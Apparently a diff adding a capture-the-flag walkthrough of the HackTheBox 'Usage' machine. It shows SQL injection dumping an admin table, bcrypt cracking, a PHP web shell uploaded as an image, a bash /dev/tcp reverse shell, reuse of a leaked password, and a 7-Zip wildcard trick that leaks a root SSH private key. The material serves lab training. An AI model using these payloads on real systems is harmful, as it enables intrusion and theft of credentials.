@@ -372,9 +372,513 @@ Database: usage_blog
 
 
 
+```bash
+❯ sqlmap -r request --level 5 --risk 3 --threads 10 -p email --batch --dbms MySQL -D usage_blog -T admin_users --dump
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.9.2#stable}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end users responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:24:05 /2025-03-07/
+
+...[snip]...
+                
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2023-08-23 06:02:19 | lS1mrTh3fcFaqE7bbfirAWBB7cFKfOjjAss6g8ZnkQ6Pd38Hzn4mpugpx45v |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+
+[00:31:14] [INFO] table 'usage_blog.admin_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv'
+[00:31:14] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 909 times
+[00:31:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/usage.htb'
+
+[*] ending @ 00:31:14 /2025-03-07/
+```
+
+
+
+<pre class="language-bash"><code class="lang-bash">❯ hashid '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
+Analyzing '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+❯ echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hashes
+<strong>
+</strong><strong>❯ john --wordlist:/usr/share/wordlists/rockyou.txt hashes
+</strong>Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+whatever1        (?)     
+1g 0:00:00:14 DONE (2025-03-07 00:35) 0.06973g/s 115.4p/s 115.4c/s 115.4C/s dipset..makayla
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (482).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (483).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (484).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+❯ cat gzzcoo.jpg
+<?php
+  system($_GET['cmd']);
+?>
+```
+
+
+
+<figure><img src="../../.gitbook/assets/5412_vmware_yfgDrNJ2Bq.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/imagen (485).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (486).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (487).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (488).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (489).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (490).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+❯ curl -s 'http://admin.usage.htb/uploads/images/gzzcoo.php?cmd=id'
+uid=1000(dash) gid=1000(dash) groups=1000(dash)
+```
+
+
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+```
+
+
+
+```bash
+❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"' | jq -sRr @uri
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22
+
+❯ curl -s 'http://admin.usage.htb/uploads/images/gzzcoo.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.2%2F443%200%3E%261%22'
+```
+
+
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.11.18] 58584
+bash: cannot set terminal process group (1206): Inappropriate ioctl for device
+bash: no job control in this shell
+dash@usage:/var/www/html/project_admin/public/uploads/images$ cat /home/dash/user.txt    
+cbd70f2e73f891b68bd359604419c4ac
+```
+
+
+
+```bash
+dash@usage:/var/www/html/project_admin/public/uploads/images$ script /dev/null -c bash
+<min/public/uploads/images$ script /dev/null -c bash          
+Script started, output log file is '/dev/null'.
+dash@usage:/var/www/html/project_admin/public/uploads/images$ ^Z
+zsh: suspended  nc -nlvp 443
+❯ stty raw -echo;fg
+[1]  + continued  nc -nlvp 443
+                              reset xterm
+dash@usage:/var/www/html/project_admin/public/uploads/images$ export TERM=xterm                       
+dash@usage:/var/www/html/project_admin/public/uploads/images$ export SHELL=bash
+dash@usage:/var/www/html/project_admin/public/uploads/images$ stty rows 46 columns 230
+```
+
+
+
+```bash
+dash@usage:~$ cat /etc/passwd | grep bash; echo; ls -l /home
+root:x:0:0:root:/root:/bin/bash
+dash:x:1000:1000:dash:/home/dash:/bin/bash
+xander:x:1001:1001::/home/xander:/bin/bash
+
+total 8
+drwxr-x--- 6 dash   dash   4096 Mar  6 23:53 dash
+drwxr-x--- 4 xander xander 4096 Apr  2  2024 xander
+```
+
+
+
+```bash
+dash@usage:~$ ls -la
+total 48
+drwxr-x--- 6 dash dash 4096 Mar  6 23:52 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2  2024 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26  2023 .monit.id
+-rw------- 1 dash dash 1192 Mar  6 23:52 .monit.state
+-rwx------ 1 dash dash  707 Oct 26  2023 .monitrc
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 Mar  6 22:28 user.txt
+dash@usage:~$ cat .monitrc 
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring 
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert 
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+```
+
+
+
+```bash
+❯ sshpass -p '3nc0d3d_pa$$w0rd' ssh xander@usage.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Mon Apr  8 01:17:46 PM UTC 2024
+
+  System load:           1.9072265625
+  Usage of /:            64.8% of 6.53GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             254
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.18
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:5616
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+xander@usage:~$ 
+```
+
+
+
+```bash
+xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+```
 
 
 
 
 
+{% tabs %}
+{% tab title="Project Backup" %}
+```bash
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
 
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Scanning the drive:
+2984 folders, 17993 files, 113887659 bytes (109 MiB)                       
+
+Creating archive: /var/backups/project.zip
+
+Items to compress: 20977
+
+                                                                               
+Files read from disk: 17993
+Archive size: 54849834 bytes (53 MiB)
+Everything is Ok
+```
+{% endtab %}
+
+{% tab title="Backup MySQL data" %}
+```bash
+xander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 2       
+xander@usage:~$ 
+```
+{% endtab %}
+
+{% tab title="Untitled" %}
+```bash
+ander@usage:~$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 3
+Password has been reset.
+```
+{% endtab %}
+{% endtabs %}
+
+
+
+```bash
+xander@usage:~$ file /usr/bin/usage_management
+/usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped
+
+xander@usage:~$ md5sum /usr/bin/usage_management
+f3c1b2b1ccacc24cc7ed8f3ad62bb7c6  /usr/bin/usage_management
+```
+
+<figure><img src="../../.gitbook/assets/imagen (491).png" alt=""><figcaption></figcaption></figure>
+
+
+
+```bash
+xander@usage:~$ strings /usr/bin/usage_management
+/lib64/ld-linux-x86-64.so.2
+chdir
+__cxa_finalize
+__libc_start_main
+puts
+system
+__isoc99_scanf
+perror
+printf
+libc.so.6
+GLIBC_2.7
+GLIBC_2.2.5
+GLIBC_2.34
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+PTE1
+u+UH
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+Password has been reset.
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 
+Invalid choice.
+```
+
+
+
+{% embed url="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html#7z" %}
+
+
+
+```bash
+xander@usage:/$ cd /var/www/html/
+xander@usage:/var/www/html$ touch @id_rsa
+xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
+xander@usage:/var/www/html$ ls -l
+total 8
+-rw-rw-r--  1 xander xander    0 Mar  7 00:10 @id_rsa
+lrwxrwxrwx  1 xander xander   17 Mar  7 00:10 id_rsa -> /root/.ssh/id_rsa
+drwxrwxr-x 13 dash   dash   4096 Apr  2  2024 project_admin
+drwxrwxr-x 12 dash   dash   4096 Apr  2  2024 usage_blog
+```
+
+
+
+```bash
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7763 64-Core Processor                 (A00F11),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 54849834
+
+Scanning the drive:
+          
+WARNING: No more files
+-----BEGIN OPENSSH PRIVATE KEY-----
+
+
+WARNING: No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+
+
+WARNING: No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
+
+
+WARNING: No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
+
+
+WARNING: No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
+
+
+WARNING: No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+
+
+WARNING: No more files
+-----END OPENSSH PRIVATE KEY-----
+
+2984 folders, 17994 files, 113888058 bytes (109 MiB)                         
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 20978
+
+                                                                               
+Files read from disk: 17994
+Archive size: 54849975 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+----------------
+Scan WARNINGS: 7
+```
+
+
+
+
+
+```bash
+❯ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+
+❯ cat id_rsa | sed 's/ : No more files//g' | sponge id_rsa
+
+❯ chmod 600 id_rsa
+
+❯ ssh -i id_rsa root@usage.htb
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Mon Apr  8 01:17:46 PM UTC 2024
+
+  System load:           1.9072265625
+  Usage of /:            64.8% of 6.53GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             254
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.18
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:5616
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
+root@usage:~# cat /root/root.txt 
+f4087919fd8aa7d094652fea39cff332
+```
